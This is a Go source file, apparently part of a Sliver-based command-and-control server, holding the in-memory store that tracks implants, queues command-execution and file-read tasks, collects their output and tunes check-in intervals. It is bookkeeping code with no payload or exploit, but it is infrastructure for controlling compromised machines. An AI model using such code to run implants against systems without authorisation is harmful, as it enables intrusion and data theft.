package litebeacon

import (
	"sort"
	"sync"
	"time"

	"github.com/bishopfox/sliver/server/log"
)

var storeLog = log.NamedLogger("litebeacon", "store")

const (
	maxQueuedTasks  = 32
	maxResults      = 32
	maxResultBytes  = 1 << 20
	maxRecentNonces = 64

	// Adaptive-interval policy (all clamped to [minIntervalSec, maxIntervalSec]).
	defaultIdleIntervalSec uint32 = 10
	defaultFastIntervalSec uint32 = 10
	minIntervalSec         uint32 = 5
	maxIntervalSec         uint32 = 86400
	activeWindow                  = 5 * time.Minute
)

// Beacon is the console-facing view of a known implant.
type Beacon struct {
	ID           string     `json:"ID"`
	Info         BeaconInfo `json:"Info"`
	SecretB64    string     `json:"SecretB64"`
	FirstSeen    time.Time  `json:"FirstSeen"`
	LastSeen     time.Time  `json:"LastSeen"`
	IntervalSec  uint32     `json:"IntervalSec"`  // 当前下发给植入体的回连间隔
	IdleSec      uint32     `json:"IdleSec"`      // 监听器空闲档
	FastSec      uint32     `json:"FastSec"`      // 监听器干活档
	Active       bool       `json:"Active"`       // 操作员活跃窗口内
	Queued       int        `json:"Queued"`       // 待下发任务数
	BaseInterval uint32     `json:"BaseInterval"` // sleep 任务设定的单信标基准；0=用空闲档
}

// Result is a completed task outcome, consumed by the console on read.
type Result struct {
	BeaconID string    `json:"BeaconID"`
	Kind     string    `json:"Kind"` // "exec" or "read"
	TaskID   uint32    `json:"TaskID"`
	Exit     int32     `json:"Exit"`
	Err      uint8     `json:"Err"`
	Output   []byte    `json:"Output"`
	At       time.Time `json:"At"`
}

type beaconState struct {
	info            BeaconInfo
	secretB64       string
	firstSeen       time.Time
	lastSeen        time.Time
	baseIntervalSec uint32 // sleep 任务设定的单信标基准；0 = 走监听器空闲策略
	lastActive      time.Time
	tasks           []Task
	results         []Result
	resultBytes     int
	nonces          map[string]struct{}
	nonceOrder      []string
}

// Store holds all lite beacon state in memory.
type Store struct {
	mutex        sync.Mutex
	beacons      map[string]*beaconState
	taskSeq      uint32
	idleInterval uint32 // 空闲（无操作员活动）时的回连间隔
	fastInterval uint32 // 操作员活跃窗口内的回连间隔
	nowFn        func() time.Time
}

func NewStore() *Store {
	return &Store{
		beacons:      map[string]*beaconState{},
		idleInterval: defaultIdleIntervalSec,
		fastInterval: defaultFastIntervalSec,
		nowFn:        time.Now,
	}
}

// SetIntervalPolicy sets the listener-level idle/fast intervals (clamped).
func (s *Store) SetIntervalPolicy(idleSec, fastSec uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.idleInterval = clampInterval(idleSec, defaultIdleIntervalSec)
	s.fastInterval = clampInterval(fastSec, defaultFastIntervalSec)
}

func clampInterval(sec, fallback uint32) uint32 {
	if sec == 0 {
		return fallback
	}
	if sec < minIntervalSec {
		return minIntervalSec
	}
	if sec > maxIntervalSec {
		return maxIntervalSec
	}
	return sec
}

// SetBaseInterval records a per-beacon base interval (from a sleep task).
func (s *Store) SetBaseInterval(id string, sec uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if st, ok := s.beacons[id]; ok && sec > 0 {
		st.baseIntervalSec = clampInterval(sec, 0)
	}
}

// NextInterval returns the interval hint for the implant's next sleep:
// fast while the operator is in an active window, otherwise the beacon's
// base (or the listener idle policy when no base was set).
func (s *Store) NextInterval(id string) uint32 {
	sec, _ := s.IntervalHint(id)
	return sec
}

// IntervalHint returns the next sleep base and whether the implant must
// sleep that many seconds exactly. exact is true only in the operator's
// active window; idle sleeps are jittered by the implant.
func (s *Store) IntervalHint(id string) (sec uint32, exact bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	now := s.nowFn()
	st, ok := s.beacons[id]
	exact = ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
	return s.nextIntervalLocked(id, now), exact
}

func (s *Store) nextIntervalLocked(id string, now time.Time) uint32 {
	st, ok := s.beacons[id]
	if ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow {
		return s.fastInterval
	}
	if ok && st.baseIntervalSec > 0 {
		return st.baseIntervalSec
	}
	return s.idleInterval
}

// Touch upserts the beacon, refreshes last-seen and enforces the replay
// window. It returns true when the nonce was already seen (reject the call).
func (s *Store) Touch(id string, nonce []byte, info *BeaconInfo, secretB64 string, now time.Time) (replayed bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		st = &beaconState{nonces: map[string]struct{}{}}
		st.firstSeen = now
		st.info.ID = id
		s.beacons[id] = st
	}
	nonceKey := string(nonce)
	if _, dup := st.nonces[nonceKey]; dup {
		return true
	}
	st.nonces[nonceKey] = struct{}{}
	st.nonceOrder = append(st.nonceOrder, nonceKey)
	if len(st.nonceOrder) > maxRecentNonces {
		delete(st.nonces, st.nonceOrder[0])
		st.nonceOrder = st.nonceOrder[1:]
	}
	if info != nil {
		merged := *info
		merged.ID = id
		st.info = merged
	}
	st.secretB64 = secretB64
	st.lastSeen = now
	return false
}

// QueueTask assigns the task an ID and queues it for the next check-in.
// It fails (ok=false) when the beacon is unknown.
func (s *Store) QueueTask(id string, t Task) (Task, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return t, false
	}
	s.taskSeq++
	t.ID = s.taskSeq
	st.tasks = append(st.tasks, t)
	st.lastActive = s.nowFn() // 操作员在干活 → 进入活跃窗口
	if len(st.tasks) > maxQueuedTasks {
		dropped := st.tasks[0]
		st.tasks = st.tasks[len(st.tasks)-maxQueuedTasks:]
		storeLog.Warnf("beacon %s task queue full: dropped oldest task %d (%#x)", id, dropped.ID, dropped.Type)
	}
	return t, true
}

func (s *Store) TakeTasks(id string) []Task {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	tasks := st.tasks
	st.tasks = nil
	return tasks
}

func (s *Store) Delete(id string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.beacons, id)
}

func (s *Store) PushResults(id string, execs []ExecResult, files []FileResult, now time.Time) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return
	}
	push := func(r Result) {
		st.results = append(st.results, r)
		st.resultBytes += len(r.Output)
		for len(st.results) > 0 && (len(st.results) > maxResults || st.resultBytes > maxResultBytes) {
			st.resultBytes -= len(st.results[0].Output)
			st.results = st.results[1:]
		}
	}
	for _, e := range execs {
		push(Result{BeaconID: id, Kind: "exec", TaskID: e.TaskID, Exit: e.Exit, Output: e.Output, At: now})
	}
	for _, f := range files {
		push(Result{BeaconID: id, Kind: "read", TaskID: f.TaskID, Err: f.Err, Output: f.Content, At: now})
	}
}

func (s *Store) TakeResults(id string) []Result {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	results := st.results
	st.results = nil
	st.resultBytes = 0
	return results
}

// IntervalPolicy returns the current listener-level idle/fast intervals.
func (s *Store) IntervalPolicy() (idle, fast uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	return s.idleInterval, s.fastInterval
}

func (s *Store) ListBeacons() []Beacon {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	now := s.nowFn()
	out := make([]Beacon, 0, len(s.beacons))
	for id, st := range s.beacons {
		active := !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
		out = append(out, Beacon{
			ID:           id,
			Info:         st.info,
			SecretB64:    st.secretB64,
			FirstSeen:    st.firstSeen,
			LastSeen:     st.lastSeen,
			IntervalSec:  s.nextIntervalLocked(id, now),
			IdleSec:      s.idleInterval,
			FastSec:      s.fastInterval,
			Active:       active,
			Queued:       len(st.tasks),
			BaseInterval: st.baseIntervalSec,
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].LastSeen.After(out[j].LastSeen) })
	return out
}
